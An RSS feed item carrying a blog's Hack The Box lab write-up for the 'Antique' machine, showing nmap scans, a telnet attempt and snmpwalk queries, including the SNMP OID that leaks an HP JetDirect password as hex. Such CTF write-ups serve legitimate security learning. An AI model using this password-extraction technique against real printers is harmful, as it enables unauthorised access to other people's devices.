<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Cups on Personal Blog</title><link>https://0x13hrafnulf.github.io/tags/cups/</link><description>Recent content in Cups on Personal Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 08 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://0x13hrafnulf.github.io/tags/cups/index.xml" rel="self" type="application/rss+xml"/><item><title>[HTB] Machine: Antique</title><link>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/antique/</link><pubDate>Tue, 08 Aug 2023 00:00:00 +0000</pubDate><guid>https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/antique/</guid><description>&lt;h1 id="antique">Antique&lt;/h1>
&lt;h2 id="enumeration">Enumeration&lt;/h2>
&lt;ul>
&lt;li>&lt;code>nmap&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ nmap -sC -sV -Pn 10.10.11.107
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 15:59 BST
Nmap scan report for 10.10.11.107 (10.10.11.107)
Host is up (0.12s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
23/tcp open telnet?
| fingerprint-strings:
| DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270:
| JetDirect
| Password:
| NULL:
|_ JetDirect
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.94%I=7%D=8/9%Time=64D3A9E6%P=x86_64-pc-linux-gnu%r(NULL,
SF:F,&amp;#34;\nHP\x20JetDirect\n\n&amp;#34;)%r(GenericLines,19,&amp;#34;\nHP\x20JetDirect\n\nPass
SF:word:\x20&amp;#34;)%r(tn3270,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(GetRequ
SF:est,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(HTTPOptions,19,&amp;#34;\nHP\x20
SF:JetDirect\n\nPassword:\x20&amp;#34;)%r(RTSPRequest,19,&amp;#34;\nHP\x20JetDirect\n\nPas
SF:sword:\x20&amp;#34;)%r(RPCCheck,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(DNSV
SF:ersionBindReqTCP,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(DNSStatusRe
SF:questTCP,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(Help,19,&amp;#34;\nHP\x20Je
SF:tDirect\n\nPassword:\x20&amp;#34;)%r(SSLSessionReq,19,&amp;#34;\nHP\x20JetDirect\n\nPas
SF:sword:\x20&amp;#34;)%r(TerminalServerCookie,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\
SF:x20&amp;#34;)%r(TLSSessionReq,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(Kerber
SF:os,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(SMBProgNeg,19,&amp;#34;\nHP\x20Je
SF:tDirect\n\nPassword:\x20&amp;#34;)%r(X11Probe,19,&amp;#34;\nHP\x20JetDirect\n\nPassword
SF::\x20&amp;#34;)%r(FourOhFourRequest,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(
SF:LPDString,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(LDAPSearchReq,19,&amp;#34;
SF:\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(LDAPBindReq,19,&amp;#34;\nHP\x20JetDirec
SF:t\n\nPassword:\x20&amp;#34;)%r(SIPOptions,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x2
SF:0&amp;#34;)%r(LANDesk-RC,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(TerminalSer
SF:ver,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(NCP,19,&amp;#34;\nHP\x20JetDirec
SF:t\n\nPassword:\x20&amp;#34;)%r(NotesRPC,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;
SF:)%r(JavaRMI,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(WMSRequest,19,&amp;#34;\
SF:nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(oracle-tns,19,&amp;#34;\nHP\x20JetDirect\
SF:n\nPassword:\x20&amp;#34;)%r(ms-sql-s,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%
SF:r(afp,19,&amp;#34;\nHP\x20JetDirect\n\nPassword:\x20&amp;#34;)%r(giop,19,&amp;#34;\nHP\x20JetDi
SF:rect\n\nPassword:\x20&amp;#34;);
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 181.59 seconds
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>telnet&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is &amp;#39;^]&amp;#39;.
HP JetDirect
Password: admin
Invalid password
Connection closed by foreign host.
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Nothing to see, so I scanned &lt;code>UDP&lt;/code> ports&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ sudo nmap -sU -sV 10.10.11.107
[sudo] password for kali:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 16:38 BST
Stats: 0:09:01 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
Nmap scan report for 10.10.11.107 (10.10.11.107)
Host is up (0.10s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT STATE SERVICE VERSION
161/udp open snmp SNMPv1 server (public)
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1013.71 seconds
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>&lt;code>snmp&lt;/code>&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ snmpwalk -v 2c -c public 10.10.11.107
iso.3.6.1.2.1 = STRING: &amp;#34;HTB Printer&amp;#34;
&lt;/code>&lt;/pre>&lt;h2 id="footholduser">Foothold/User&lt;/h2>
&lt;ul>
&lt;li>According to this &lt;a href="http://www.irongeek.com/i.php?page=security/networkprinterhacking#JetDirect%20password%20notes" target="_blank" rel="noopener">post&lt;/a> we can retrieve password
&lt;ul>
&lt;li>We need to ask for &lt;code>.1.3.6.1.4.1.11.2.3.9.1.1.13.0&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>└─$ snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Now we need to convert it from hex to ascii&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://0x13hrafnulf.github.io/posts/cybersecurity/hackthebox/machines/linux/antique/images/1.png">&lt;/p></description></item></channel></rss>